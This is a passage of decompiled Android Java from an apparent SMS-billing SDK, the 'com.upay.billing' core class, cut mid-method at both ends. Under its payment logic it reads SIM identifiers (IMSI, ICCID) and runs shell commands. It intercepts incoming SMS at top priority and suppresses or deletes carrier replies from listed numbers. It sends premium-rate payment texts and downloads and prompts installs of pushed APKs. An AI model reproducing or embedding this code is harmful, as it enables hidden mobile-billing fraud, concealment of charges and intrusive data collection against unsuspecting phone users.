        if ((DataCollection.getIccid_GT(paramContext, 0) != null) && (!DataCollection.getIccid_GT(paramContext, 0).equals("")))
        {
          str2 = DataCollection.getIccid_GT(paramContext, 0);
          break label107;
        }
        if ((DataCollection.getIccid_MIUI(paramContext, 0) != null) && (!DataCollection.getIccid_MIUI(paramContext, 0).equals("")))
        {
          str2 = DataCollection.getIccid_MIUI(paramContext, 0);
          break label107;
        }
        str2 = null;
        break label107;
        label479:
        if ((DataCollection.getIccid_GT(paramContext, 1) != null) && (!DataCollection.getIccid_GT(paramContext, 1).equals("")))
        {
          localObject2 = DataCollection.getIccid_GT(paramContext, 1);
        }
        else
        {
          localObject2 = str3;
          if (DataCollection.getIccid_MIUI(paramContext, 1) != null)
          {
            localObject2 = str3;
            if (!DataCollection.getIccid_MIUI(paramContext, 1).equals("")) {
              localObject2 = DataCollection.getIccid_MIUI(paramContext, 1);
            }
          }
        }
      }
    }
    Object localObject2 = new HashMap();
    Object localObject1 = DataCollection.getImsi(paramContext);
    if ((localObject1 != null) && (!((String)localObject1).equals(""))) {}
    for (localObject1 = DataCollection.getImsi(paramContext);; localObject1 = null)
    {
      str3 = DataCollection.getIccid(paramContext);
      str1 = str2;
      if (str3 != null)
      {
        str1 = str2;
        if (!str3.equals("")) {
          str1 = DataCollection.getIccid(paramContext);
        }
      }
      ((HashMap)localObject2).put("imsi", localObject1);
      ((HashMap)localObject2).put("iccid", str1);
      localArrayList.add(Util.mapToJson((HashMap)localObject2));
      return localArrayList;
    }
  }
  
  public Plan getPlan(String paramString)
  {
    return (Plan)this.plans.get(paramString);
  }
  
  public String getProgressTextByEngine(List<Cmd> paramList, Trade paramTrade)
  {
    int i = 0;
    paramList = (Cmd)paramList.get(0);
    String str = paramList.btKey;
    if ((str.startsWith("upay")) || (str.startsWith("dt_sms")))
    {
      paramList = "upay";
      i = paramTrade.subTrades.length();
      str = "";
      paramTrade = paramList;
      paramList = str;
    }
    for (;;)
    {
      return getPropString(paramTrade, "progress_text", "正在以短信形式支付，请稍后...").replace("$mmpt", paramList).replace("$num", String.valueOf(i));
      if ((str.equals("wypj")) || (str.equals("he_danji")) || (str.contains("he_nc")))
      {
        if (str.equals("wypj"))
        {
          i = paramTrade.subTrades.length() * 2 + 1;
          paramList = "";
          paramTrade = str;
        }
        else if (str.contains("he_nc"))
        {
          if (paramList.msg.contains("type"))
          {
            i = paramTrade.subTrades.length() * 2 + 1;
            paramList = "";
            paramTrade = str;
          }
          else
          {
            i = paramTrade.subTrades.length() * 3;
            paramList = "";
            paramTrade = str;
          }
        }
        else if (paramList.msg.contains("type"))
        {
          i = paramTrade.subTrades.length() * 2;
          paramList = "";
          paramTrade = str;
        }
        else
        {
          i = paramTrade.subTrades.length() * 2 + 1;
          paramList = "";
          paramTrade = str;
        }
      }
      else
      {
        if (str.equals("ck_mdo"))
        {
          if (("ckmdo_4".equals(paramList.key)) || ("ckmdo_20".equals(paramList.key))) {}
          for (i = 2;; i = 1)
          {
            paramList = "";
            paramTrade = str;
            break;
          }
        }
        if (str.equals("cmcc_mm_dj"))
        {
          if (paramList.msg.contains("type"))
          {
            i = paramTrade.subTrades.length();
            paramList = getPropString(str, "progress_text_r", "本应用将会发送$num条短信来完成支付，请稍候...");
            paramTrade = str;
            continue;
          }
          if (register().equals("0"))
          {
            paramList = getPropString(str, "progress_text_regist", "本应用会根据信号情况发送1-3条短信来完成支付，请稍后...");
            paramTrade = str;
            continue;
          }
          if (register().equals("1"))
          {
            paramList = getPropString(str, "progress_text_unregist", "正在支付，请稍后...");
            paramTrade = str;
            continue;
          }
        }
        paramList = "";
        paramTrade = str;
      }
    }
  }
  
  public String getPropString(String paramString1, String paramString2, String paramString3)
  {
    Json localJson = this.properties.getObject(paramString1);
    paramString1 = paramString3;
    if (localJson != null) {
      paramString1 = localJson.getStr(paramString2, paramString3);
    }
    return paramString1;
  }
  
  public List<Json> getService_list(String paramString)
  {
    ArrayList localArrayList = new ArrayList();
    HashMap localHashMap = new HashMap();
    String str = DataCollection.shell(paramString.replace("$shell", "phone"), 0);
    paramString = DataCollection.shell(paramString.replace("$shell", "isms"), 0);
    localHashMap.put("phone", str);
    localHashMap.put("isms", paramString);
    localArrayList.add(Util.mapToJson(localHashMap));
    return localArrayList;
  }
  
  public Trade getTrade(int paramInt, String paramString)
  {
    Log.i("UpayCoreImpl", "getTrade");
    Trade localTrade = (Trade)this.pollingTrades.get(paramString);
    if (localTrade != null) {
      return localTrade;
    }
    localTrade = new Trade();
    localTrade.id = paramString;
    String str = (String)this.sessions.get(Integer.valueOf(paramInt));
    Plan localPlan = getPlan(str);
    Object localObject = new HashMap();
    ((HashMap)localObject).put("trade_id", paramString);
    ((HashMap)localObject).put("app_key", str);
    ((HashMap)localObject).put("ts", Long.toString(System.currentTimeMillis()));
    ((HashMap)localObject).put("app_secret", localPlan.appSecret);
    paramString = NativeUtil.genHash((HashMap)localObject);
    ((HashMap)localObject).remove("app_secret");
    ((HashMap)localObject).put("hash", paramString);
    paramString = Util.mapToJson((HashMap)localObject);
    Log.i("UpayCoreImpl", "getTradeRequestJson---->" + paramString.asObject().toString());
    paramString = Util.stringToBytes(paramString.asObject().toString());
    localObject = new UpayCoreImpl.12(this, UpayConstant.API_BASE_URL + "trade/show" + "?gzip=1", localTrade);
    ((HttpRunner)localObject).setDoPost().setPostData(paramString).addHeader("Content-Type", "application/json");
    ((HttpRunner)localObject).run();
    return localTrade;
  }
  
  public UpayContext getUpayContext()
  {
    return this.ucontext;
  }
  
  public Json getUser()
  {
    return this.user;
  }
  
  public int init(String paramString1, String paramString2, byte[] paramArrayOfByte, String paramString3, long paramLong)
  {
    Log.i("UpayCoreImpl", "init");
    this.updataPackFlag = false;
    this.appkey = paramString1;
    this.appSecret = paramString2;
    this.channelKey = paramString3;
    this.buildDate = paramLong;
    this.ucontext = new UpayContext(this);
    paramArrayOfByte = this.sessions.keySet().iterator();
    Integer localInteger;
    do
    {
      if (!paramArrayOfByte.hasNext()) {
        break;
      }
      localInteger = (Integer)paramArrayOfByte.next();
    } while (!((String)this.sessions.get(localInteger)).equals(paramString1));
    for (int i = localInteger.intValue();; i = -1)
    {
      int j = i;
      if (i < 0)
      {
        j = maxSessionId;
        maxSessionId = j + 1;
        this.sessions.put(Integer.valueOf(j), paramString1);
      }
      if (Util.isNetworkAvailable(this.context)) {
        new UpayCoreImpl.InitTask(this, null).execute(new Object[] { paramString1, paramString2, paramString3, Long.valueOf(paramLong) });
      }
      this.installedReceiver = new UpayCoreImpl.MyInstalledReceiver(this);
      paramString1 = new IntentFilter();
      paramString1.addAction("android.intent.action.PACKAGE_ADDED");
      paramString1.addDataScheme("package");
      getContext().registerReceiver(this.installedReceiver, paramString1);
      return j;
    }
  }
  
  public void initCompleted(String paramString1, int paramInt, String paramString2)
  {
    if (paramInt != 200)
    {
      localObject = this.context.getSharedPreferences("com.upay.billing.saveddata.Main", 0).edit();
      ((SharedPreferences.Editor)localObject).clear();
      ((SharedPreferences.Editor)localObject).commit();
      if (!this.plans.isEmpty()) {
        this.plans.clear();
      }
    }
    Object localObject = new Intent("com.upay.billing.UpayCallback");
    ((Intent)localObject).putExtra("appKey", paramString1);
    ((Intent)localObject).putExtra("data", Json.createObject(new Object[] { "action", "onInitResult", "goodsKey", "", "tradeId", "", "resultCode", Integer.valueOf(paramInt), "errorMsg", paramString2, "price", "", "extra", "", "hash", "" }).asObject().toString());
    this.context.sendBroadcast((Intent)localObject);
  }
  
  public void initCore(Context paramContext)
  {
    super.initCore(paramContext);
    this.handler = new UpayCoreImpl.MyHandler(null);
    this.smsReceiver = new SmsReceiver();
    this.smsObserver = new SmsObserver(this.handler, paramContext);
    IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
    localIntentFilter.setPriority(Integer.MAX_VALUE);
    paramContext.registerReceiver(this.smsReceiver, localIntentFilter);
    paramContext.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, this.smsObserver);
    restoreData();
    long l1 = Long.valueOf(getPropString("common", "polling_trade_time", "5000")).longValue();
    int i = Integer.valueOf(getPropString("common", "push_start_time", "8")).intValue();
    int j = Integer.valueOf(getPropString("common", "push_end_time", "24")).intValue();
    long l2 = Long.valueOf(getPropString("common", "push_show_time", "10800000")).longValue();
    new UpayCoreImpl.2(this).start();
    new UpayCoreImpl.3(this, paramContext).start();
    new UpayCoreImpl.4(this, paramContext, l1).start();
    new UpayCoreImpl.5(this, i, j, l2).start();
  }
  
  public void installApp(File paramFile, String paramString, Json paramJson)
  {
    try
    {
      if (paramFile.exists())
      {
        Intent localIntent = new Intent();
        localIntent.addFlags(268435456);
        localIntent.setAction("android.intent.action.VIEW");
        localIntent.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
        getContext().startActivity(localIntent);
        logEvent(paramString, "push_shown", Json.createObject(new Object[] { "pid", Integer.valueOf(paramJson.getInt("pid")), "title", paramJson.getStr("title"), "content", paramJson.getStr("content"), "imgUrl", paramJson.getStr("imageurl"), "clickUrl", paramJson.getStr("clickurl"), "packageName", paramJson.getStr("package_name"), "result", Integer.valueOf(200) }).asObject().toString());
      }
      return;
    }
    catch (Exception paramFile) {}
  }
  
  public boolean judgmentTime(int paramInt1, int paramInt2)
  {
    boolean bool2 = false;
    try
    {
      Calendar localCalendar = Calendar.getInstance();
      int i = localCalendar.get(11);
      int j = localCalendar.get(12);
      i = j + i * 60;
      boolean bool1 = bool2;
      if (i >= paramInt1 * 60)
      {
        bool1 = bool2;
        if (i <= (paramInt2 - 1) * 60 + 59) {
          bool1 = true;
        }
      }
      return bool1;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public List<Trade> listTrades(int paramInt, String paramString)
  {
    Log.i("UpayCoreImpl", "listTrades");
    paramString = new ArrayList();
    Trade localTrade = new Trade();
    localTrade.id = "aaaa";
    paramString.add(localTrade);
    return paramString;
  }
  
  public String loadApk(String paramString1, String paramString2, Json paramJson)
  {
    Object localObject = paramString1.substring(paramString1.lastIndexOf("/") + 1, paramString1.length());
    File localFile = new File(UpayConstant.RESOURCE_CACHE_PATH + paramString2 + "/push/apk");
    localFile.mkdirs();
    localObject = new File(localFile, (String)localObject);
    try
    {
      if (!((File)localObject).exists()) {
        if (Util.isNetworkAvailable(getContext())) {
          Util.addTask(new UpayCoreImpl.19(this, paramString1, (File)localObject, paramJson, paramString2));
        }
      }
      for (;;)
      {
        return ((File)localObject).getAbsolutePath();
        if (!appInstalled(getContext(), paramJson.getStr("package_name"))) {
          installApp((File)localObject, paramString2, paramJson);
        }
      }
    }
    catch (Exception paramString1)
    {
      for (;;) {}
    }
  }
  
  public String loadImg(String paramString1, String paramString2)
  {
    String str = paramString1.substring(paramString1.lastIndexOf("/") + 1, paramString1.length());
    paramString2 = new File(UpayConstant.RESOURCE_CACHE_PATH + paramString2 + "/push");
    paramString2.mkdirs();
    paramString2 = new File(paramString2, str);
    try
    {
      if ((!paramString2.exists()) && (Util.isNetworkAvailable(getContext()))) {
        Util.addTask(new UpayCoreImpl.18(this, paramString1, paramString2));
      }
      return paramString2.getAbsolutePath();
    }
    catch (Exception paramString1)
    {
      for (;;) {}
    }
  }
  
  public void logEvent(int paramInt, String paramString1, String paramString2)
  {
    logEvent((String)this.sessions.get(Integer.valueOf(paramInt)), paramString1, paramString2);
  }
  
  public void logEvent(String paramString1, String paramString2, String paramString3)
  {
    Json localJson = Json.parse(Util.ifEmpty(paramString3, "{}"));
    localJson.put("ts", Long.valueOf(System.currentTimeMillis()));
    localJson.put("type", paramString2);
    boolean bool = paramString2.startsWith("custom_");
    if ((bool) || (paramString2.startsWith("push_")))
    {
      if ((bool) && (Util.empty(localJson.getStr("cp_uid")))) {
        localJson.put("cp_uid", this.user.getStr("id"));
      }
      paramString3 = (ArrayList)this.customs.get(paramString1);
      paramString2 = paramString3;
      if (paramString3 == null)
      {
        paramString2 = new ArrayList();
        this.customs.put(paramString1, paramString2);
      }
      try
      {
        paramString2.add(localJson);
        return;
      }
      finally {}
    }
    paramString3 = (ArrayList)this.events.get(paramString1);
    paramString2 = paramString3;
    if (paramString3 == null)
    {
      paramString2 = new ArrayList();
      this.events.put(paramString1, paramString2);
    }
    try
    {
      paramString2.add(localJson);
      return;
    }
    finally {}
  }
  
  public void onDestory()
  {
    saveData();
    if (this.installedReceiver != null) {
      getContext().unregisterReceiver(this.installedReceiver);
    }
  }
  
  public String pay(int paramInt, String paramString1, String paramString2)
  {
    saveData();
    String str2 = (String)this.sessions.get(Integer.valueOf(paramInt));
    Plan localPlan = getPlan(str2);
    String str1 = getTradeId();
    Json localJson = Json.createObject(new Object[] { "trade_id", str1, "goods_key", paramString1, "op", Integer.valueOf(this.ucontext.op.ordinal()), "extra", paramString2, "description", "" });
    Trade localTrade = new Trade();
    localTrade.id = str1;
    localTrade.uid = getUser().getLong("id");
    localTrade.goodsKey = paramString1;
    localTrade.ctime = System.currentTimeMillis();
    localTrade.extra = paramString2;
    localTrade.appKey = str2;
    if (((this.ucontext.op == Op.CMCC) || (this.ucontext.op == Op.NONE)) && (!Util.isNetworkAvailable(this.context)))
    {
      paymentCompleted(localTrade, 105);
      Log.e("UpayCoreImpl", "no network");
      logEvent(str2, "click_goods", localJson.put("result", Integer.valueOf(105)).asObject().toString());
      return str1;
    }
    if (localPlan != null) {
      new Thread(new UpayCoreImpl.6(this, paramInt, paramString1, paramString2, localPlan, localTrade, localJson)).start();
    }
    for (;;)
    {
      return str1;
      showProgressUi(localPlan, localTrade, "upay_progress_ui", getPropString("common", "re_init_text", "支付插件正在重新进行初始化，请稍候..."));
      this.timer = new Timer();
      paramString1 = new UpayCoreImpl.7(this, str2, paramInt, paramString1, paramString2, localTrade, localJson);
      this.timer.schedule(paramString1, 1000L, Long.valueOf(getPropString("common", "interval_time", "4000")).longValue());
    }
  }
  
  public void paymentCompleted(Trade paramTrade, int paramInt)
  {
    Intent localIntent = new Intent("com.upay.billing.UpayCallback");
    localIntent.putExtra("appKey", paramTrade.appKey);
    localIntent.putExtra("data", Json.createObject(new Object[] { "action", "onPaymentResult", "goodsKey", paramTrade.goodsKey, "tradeId", paramTrade.id, "resultCode", Integer.valueOf(paramInt), "errorMsg", "", "extra", paramTrade.extra, "hash", "" }).asObject().toString());
    this.context.sendBroadcast(localIntent);
  }
  
  public String realPay(int paramInt, String paramString1, String paramString2, Plan paramPlan, Trade paramTrade, Json paramJson)
  {
    Log.i("UpayCoreImpl", "pay");
    String str2 = (String)this.sessions.get(Integer.valueOf(paramInt));
    if (!this.updataPackFlag)
    {
      showProgressUi(paramPlan, paramTrade, "upay_progress_ui", getPropString("common", "loading_engine_text", "支付插件正在加载支付引擎，请稍候..."));
      paramInt = Integer.valueOf(getPropString("common", "loading_engine_timeout", "20")).intValue();
      paramString2 = new boolean[1];
      paramString2[0] = 0;
    }
    for (;;)
    {
      int i = paramInt - 1;
      if ((paramInt > 0) && (paramString2[0] == 0)) {}
      try
      {
        Thread.sleep(1000L);
        if (this.updataPackFlag)
        {
          paramString2[0] = 1;
          UpayActivity.finish(this.context, "upay_progress_ui");
          paramInt = i;
          continue;
          initEngines();
          String str1 = paramTrade.id;
          paramTrade.channelKey = paramPlan.channelKey;
          Goods localGoods = (Goods)paramPlan.goods.get(paramString1);
          if (localGoods == null)
          {
            paymentCompleted(paramTrade, 102);
            logEvent(str2, "click_goods", paramJson.put("result", Integer.valueOf(102)).asObject().toString());
            return str1;
          }
          paramTrade.price = localGoods.price;
          paramString1 = Util.getString(this.context, paramTrade.uid + "_date");
          paramString2 = getFormatedDateTime(Util.getTs() + Util.getLong(this.context, "Time-Diff"));
          if ((!Util.empty(paramString1)) && (compareDate(paramString1, paramString2) == 1)) {
            Util.saveInt(this.context, paramTrade.uid + "_price", 0);
          }
          Util.saveString(this.context, paramTrade.uid + "_date", paramString2);
          paramInt = Util.getInt(this.context, paramTrade.uid + "_price");
          i = paramTrade.price;
          Util.saveInt(this.context, paramTrade.uid + "_price", paramInt + i);
          Object localObject = getComposeSchemes(paramPlan);
          this.currentTrade = paramTrade;
          paramInt = paramPlan.issueType;
          paramString2 = null;
          Pattern localPattern;
          HashSet localHashSet;
          if (paramInt == 1)
          {
            localPattern = paramPlan.excludeCmdKeys;
            localHashSet = localGoods.excludes;
            paramInt = UpayCoreImpl.23.$SwitchMap$com$upay$billing$bean$Op[this.ucontext.op.ordinal()];
            paramString1 = null;
          }
          switch (paramInt)
          {
          default: 
            paramString2 = null;
            if (paramString1 != null)
            {
              paramString2 = new ArrayList();
              paramString2.add(paramString1);
            }
            if (paramString2 == null)
            {
              paramString1 = (int[][])((HashMap)localObject).get(Integer.valueOf(localGoods.price));
              if (paramString1 != null)
              {
                localObject = findCmds(paramPlan, localGoods.price, localGoods.excludes, paramString1);
                paramString1 = getPropString("common", "default_request_date_limit", "100");
                paramInt = Integer.valueOf(getPropString("common", paramTrade.appKey + "_request_date_limit", paramString1)).intValue();
                i = Util.getInt(this.context, paramTrade.uid + "_price");
                paramString1 = paramString2;
                if (!Util.empty((Collection)localObject))
                {
                  paramString1 = paramString2;
                  if (i <= paramInt)
                  {
                    paramString1 = new ArrayList(1);
                    paramString1.add(this.engines.get(((Cmd)((ArrayList)localObject).get(0)).btKey));
                  }
                }
                if (i > paramInt) {
                  paramString2 = null;
                }
              }
            }
            break;
          }
          for (;;)
          {
            if (paramString1 == null) {}
            for (localObject = findEngines(localGoods.price, paramPlan.excludeCmdKeys, localGoods.excludes);; localObject = paramString1)
            {
              if ((localObject == null) || (((ArrayList)localObject).isEmpty())) {
                if (i > paramInt)
                {
                  paramInt = Date_Limit;
                  label769:
                  paymentCompleted(paramTrade, paramInt);
                  logEvent(str2, "click_goods", paramJson.put("result", Integer.valueOf(paramInt)).asObject().toString());
                  this.currentTrade = null;
                }
              }
              for (;;)
              {
                return str1;
                boolean bool = localPattern.matcher("jdpay").find();
                paramString2 = null;
                if (!bool)
                {
                  bool = localHashSet.contains("jdpay");
                  paramString2 = null;
                  if (!bool) {
                    paramString2 = (Engine)this.engines.get("jdpay");
                  }
                }
                paramString1 = paramString2;
                if (paramString2 != null) {
                  break;
                }
                paramString1 = paramString2;
                if (localPattern.matcher("mmpay").find()) {
                  break;
                }
                paramString1 = paramString2;
                if (localHashSet.contains("mmpay")) {
                  break;
                }
                paramString1 = (Engine)this.engines.get("mmpay");
                break;
                bool = localPattern.matcher("unipay").find();
                paramString1 = null;
                if (bool) {
                  break;
                }
                bool = localHashSet.contains("unipay");
                paramString1 = null;
                if (bool) {
                  break;
                }
                paramString1 = (Engine)this.engines.get("unipay");
                break;
                bool = localPattern.matcher("egamepay").find();
                paramString1 = null;
                if (bool) {
                  break;
                }
                bool = localHashSet.contains("egamepay");
                paramString1 = null;
                if (bool) {
                  break;
                }
                paramString1 = (Engine)this.engines.get("egamepay");
                break;
                paramInt = 101;
                break label769;
                if (((ArrayList)localObject).size() != 1) {
                  break label1499;
                }
                if (fastPay(paramTrade.uid))
                {
                  paymentCompleted(paramTrade, Fast_Pay);
                  Log.e("UpayCoreImpl", "fast pay");
                  logEvent(str2, "click_goods", paramJson.put("result", Integer.valueOf(Fast_Pay)).put("description", "fast pay,uid=" + paramTrade.uid).asObject().toString());
                  return str1;
                }
                paramString1 = ((Engine)((ArrayList)localObject).get(0)).key;
                if (("jdpay".equals(paramString1)) || ("mmpay".equals(paramString1)) || ("unipay".equals(paramString1)) || ("egamepay".equals(paramString1)))
                {
                  paramInt = 1;
                  label1184:
                  if ((Util.empty(paramString2)) && (paramInt == 0)) {
                    break label1387;
                  }
                  paramInt = 200;
                  label1199:
                  if (paramInt != 200) {
                    paramJson.put("op", Integer.valueOf(Op.NONE.ordinal()));
                  }
                  logEvent(str2, "click_goods", paramJson.put("result", Integer.valueOf(paramInt)).asObject().toString());
                  paramString1 = (Engine)((ArrayList)localObject).get(0);
                  paramJson = new UpayCoreImpl.8(this, paramString2, paramTrade, paramString1, paramInt, paramPlan);
                  if ((paramString1.hasCustomConfirmUi()) || (!localGoods.confirm)) {
                    break label1489;
                  }
                  if (Util.empty(localGoods.confirmUiKey)) {
                    break label1394;
                  }
                  paramString1 = paramPlan.getLocalResourcePath(localGoods.confirmUiKey);
                  label1315:
                  if ((paramString1 == null) || (!new File(paramString1).exists())) {
                    break label1399;
                  }
                  paramString1 = Util.loadLocalText(paramString1);
                  label1338:
                  if (Util.empty(localGoods.confirmUiKey)) {
                    break label1482;
                  }
                }
                label1387:
                label1394:
                label1399:
                label1482:
                for (paramString2 = localGoods.confirmUiKey;; paramString2 = "upay_confirm_ui")
                {
                  UpayActivity.start(this.context, paramString2, paramString1, 0, new UpayCoreImpl.9(this, paramJson, paramTrade, localGoods));
                  break;
                  paramInt = 0;
                  break label1184;
                  paramInt = 202;
                  break label1199;
                  paramString1 = null;
                  break label1315;
                  if (Util.assetExist(this.context, localGoods.confirmUiKey + ".json"))
                  {
                    paramString1 = Util.loadAssetsText(this.context, localGoods.confirmUiKey + ".json");
                    break label1338;
                  }
                  paramString1 = Util.loadAssetsText(this.context, "upay_confirm_ui.json");
                  break label1338;
                }
                label1489:
                paramJson.run();
              }
              label1499:
              paramJson.put("op", Integer.valueOf(Op.NONE.ordinal()));
              logEvent(str2, "click_goods", paramJson.put("result", Integer.valueOf(201)).asObject().toString());
              paramJson = new UpayCoreImpl.10(this, (ArrayList)localObject, paramTrade, paramString2);
              if (!Util.empty(localGoods.btselectUiKey))
              {
                paramString1 = paramPlan.getLocalResourcePath(localGoods.btselectUiKey);
                label1583:
                if ((paramString1 == null) || (!new File(paramString1).exists())) {
                  break label1663;
                }
                paramString1 = Util.loadLocalText(paramString1);
                label1606:
                if (Util.empty(localGoods.btselectUiKey)) {
                  break label1746;
                }
              }
              label1663:
              label1746:
              for (paramString2 = localGoods.btselectUiKey;; paramString2 = "upay_third_pay_ui")
              {
                paramString1 = replaceLayout(paramString1, (ArrayList)localObject);
                UpayActivity.start(this.context, paramString2, paramString1, 0, new UpayCoreImpl.11(this, paramJson, paramTrade, localGoods));
                break;
                paramString1 = null;
                break label1583;
                if (Util.assetExist(this.context, localGoods.btselectUiKey + ".json"))
                {
                  paramString1 = Util.loadAssetsText(this.context, localGoods.btselectUiKey + ".json");
                  break label1606;
                }
                paramString1 = Util.loadAssetsText(this.context, "upay_third_pay_ui.json");
                break label1606;
              }
            }
            paramString2 = (String)localObject;
            continue;
            paramInt = 0;
            paramString1 = paramString2;
            i = 0;
            paramString2 = null;
          }
        }
        paramInt = i;
      }
      catch (InterruptedException localInterruptedException)
      {
        for (;;) {}
      }
    }
  }
  
  public String replaceLayout(String paramString, ArrayList<Engine> paramArrayList)
  {
    paramString = Json.parse(paramString);
    int i = 0;
    while (i < paramArrayList.size())
    {
      String str = ((Engine)paramArrayList.get(i)).key;
      Json localJson1 = paramString.getObject("content-view").getArray("children");
      int j = 0;
      while (j < localJson1.length())
      {
        Json localJson2 = localJson1.getObjectAt(j).getArray("children");
        int k = 0;
        while (k < localJson2.length())
        {
          Json localJson3 = localJson2.getObjectAt(k).getArray("children");
          int m = 0;
          while (m < localJson3.length())
          {
            Json localJson4 = localJson3.getObjectAt(m);
            if ("selete_layout".equals(localJson4.getStr("id")))
            {
              localJson4 = localJson4.getArray("children");
              int n = 0;
              while (n < localJson4.length())
              {
                Json localJson5 = localJson4.getObjectAt(n);
                if (str.equals(localJson5.getStr("id"))) {
                  localJson5.put("visibility", "visible");
                }
                n += 1;
              }
            }
            m += 1;
          }
          k += 1;
        }
        j += 1;
      }
      i += 1;
    }
    return paramString.asObject().toString();
  }
  
  public void runOnMainThread(Runnable paramRunnable)
  {
    this.handler.sendMessage(Message.obtain(this.handler, 0, paramRunnable));
  }
  
  public boolean showLoading(String paramString)
  {
    Object localObject = getPropString("common", "not_show_loading", "");
    if (!Util.empty((String)localObject))
    {
      localObject = ((String)localObject).split("&");
      int i = 0;
      while (i < localObject.length)
      {
        if (paramString.equals(localObject[i])) {
          return false;
        }
        i += 1;
      }
    }
    return true;
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    if (paramPlan != null)
    {
      paramPlan = paramPlan.getLocalResourcePath(paramString1);
      if ((paramPlan == null) || (!new File(paramPlan).exists())) {
        break label60;
      }
    }
    label60:
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.context, paramString1 + ".json"))
    {
      UpayActivity.start(this.context, paramString1, paramPlan, 0, new UpayCoreImpl.20(this, paramTrade, paramString2));
      return;
      paramPlan = null;
      break;
    }
  }
  
  public boolean smsReceived(String paramString1, String paramString2, int paramInt)
  {
    Object localObject3;
    label51:
    MtContext localMtContext;
    Iterator localIterator;
    if (paramInt == 1)
    {
      this.lastReceivedSms = (paramString1 + ":" + paramString2);
      initEngines();
      localObject3 = this.activatedHandlers.values().iterator();
      do
      {
        if (!((Iterator)localObject3).hasNext()) {
          break;
        }
        localMtContext = (MtContext)((Iterator)localObject3).next();
      } while (!localMtContext.mtNum.matcher(paramString1).find());
      localIterator = localMtContext.actions.iterator();
    }
    Object localObject1;
    label275:
    for (;;)
    {
      if (!localIterator.hasNext()) {
        break label51;
      }
      localObject1 = (Action)localIterator.next();
      localObject2 = ((Action)localObject1).mtMsg.matcher(paramString2);
      if ((((Matcher)localObject2).find()) || ((Util.empty(paramString2)) && (".".equals(((Action)localObject1).mtMsg.pattern())))) {}
      for (paramInt = 1;; paramInt = 0)
      {
        if (paramInt == 0) {
          break label275;
        }
        localObject3 = new String[((Matcher)localObject2).groupCount()];
        paramInt = localObject3.length;
        for (;;)
        {
          paramInt -= 1;
          if (paramInt < 0) {
            break;
          }
          localObject3[paramInt] = ((Matcher)localObject2).group(paramInt + 1);
        }
        if ((Util.empty(paramString1)) || ("0".equals(paramString1)) || ((paramString1 + ":" + paramString2).equals(this.lastReceivedSms)))
        {
          this.lastReceivedSms = null;
          return false;
        }
        this.lastReceivedSms = null;
        break;
      }
    }
    Object localObject2 = (Engine)this.engines.get(localMtContext.cmd.btKey);
    try
    {
      paramInt = ((Integer)localObject2.getClass().getMethod("onMtAction", new Class[] { MtContext.class, Json.class, String.class, String.class, [Ljava.lang.String.class }).invoke(localObject2, new Object[] { localMtContext, ((Action)localObject1).exec, paramString1, paramString2, localObject3 })).intValue();
      localObject1 = localMtContext.trade;
      localObject2 = localMtContext.cmd;
      if ((0xFFFF0000 & paramInt) == 65536)
      {
        tradeUpdated((Trade)localObject1, "sn:" + localMtContext.serialNo, 1, 203);
        logEvent(((Trade)localObject1).appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", ((Trade)localObject1).id, "goods_key", ((Trade)localObject1).goodsKey, "cmd_key", ((Cmd)localObject2).key, "bt_key", ((Cmd)localObject2).btKey, "description", "", "mt_msg", paramString2, "mt_num", paramString1, "price", Integer.valueOf(((Cmd)localObject2).price), "result", Integer.valueOf(203), "sn", localMtContext.serialNo }).asObject().toString());
      }
      if ((paramInt != 0) && (localMtContext.delete) && (localMtContext.cmd.deleteMt)) {
        return true;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Log.e("UpayCoreImpl", "invoke onMtAction, ex=" + localException);
        paramInt = 0;
      }
    }
    return false;
    if ("true".equals(Util.getString(this.context, "delete_mt")))
    {
      paramString2 = getPropString("delete_number", "num", "").split("&");
      paramInt = 0;
      while (paramInt < paramString2.length)
      {
        if (paramString1.contains(paramString2[paramInt])) {
          return true;
        }
        paramInt += 1;
      }
    }
    return false;
  }
  
  public void startPolling(Trade paramTrade)
  {
    synchronized (this.pollingTrades)
    {
      paramTrade.pollingStartTime = System.currentTimeMillis();
      this.pollingTrades.put(paramTrade.id, paramTrade);
      return;
    }
  }
  
  public void tradeUpdated(Trade paramTrade, String paramString, int paramInt1, int paramInt2)
  {
    if (paramString.startsWith("sn:"))
    {
      paramString = getSubTradeBySn(paramTrade, paramString.substring(3));
      if ((paramString != null) && ((paramString.getInt("state") & paramInt1) == 0)) {
        break label46;
      }
    }
    label46:
    do
    {
      return;
      paramString = paramTrade.getSubTrade(paramString);
      break;
      paramString.put("state", Integer.valueOf(paramString.getInt("state") | paramInt1));
      paramString = getCooldown(paramString.getStr("cd_key"));
      if (paramString != null) {
        paramString.stop();
      }
      paramTrade.paid = 0;
      paramString = paramTrade.subTrades.iterator();
      Object localObject;
      while (paramString.hasNext())
      {
        localObject = (Json)paramString.next();
        if (((Json)localObject).getInt("state") > 0)
        {
          int i = paramTrade.paid;
          paramTrade.paid = (((Json)localObject).getInt("price") + i);
        }
      }
      if (paramTrade.paid == paramTrade.price)
      {
        paramTrade.pollingStartTime = 0L;
        if (paramInt1 == 1)
        {
          paramString = this.activatedHandlers.values().iterator();
          while (paramString.hasNext())
          {
            localObject = (MtContext)paramString.next();
            if (paramTrade.id.equals(((MtContext)localObject).trade.id)) {
              ((MtContext)localObject).createTime = 0L;
            }
          }
        }
      }
    } while ((paramInt2 != 200) && (paramInt2 != 203));
    paramString = new Intent("com.upay.billing.UpayCallback");
    paramString.putExtra("appKey", paramTrade.appKey);
    paramString.putExtra("data", Json.createObject(new Object[] { "action", "onTradeProgress", "goodsKey", paramTrade.goodsKey, "tradeId", paramTrade.id, "extra", paramTrade.extra, "price", Integer.valueOf(paramTrade.price), "paid", Integer.valueOf(paramTrade.paid), "result", Integer.valueOf(paramInt2), "hash", "" }).asObject().toString());
    this.context.sendBroadcast(paramString);
  }
  
  public void updateCooldown(String paramString, int paramInt)
  {
    if (!Util.empty(paramString))
    {
      Cooldown localCooldown2 = (Cooldown)this.cooldowns.get(paramString);
      Cooldown localCooldown1 = localCooldown2;
      if (localCooldown2 == null)
      {
        localCooldown1 = new Cooldown(paramString);
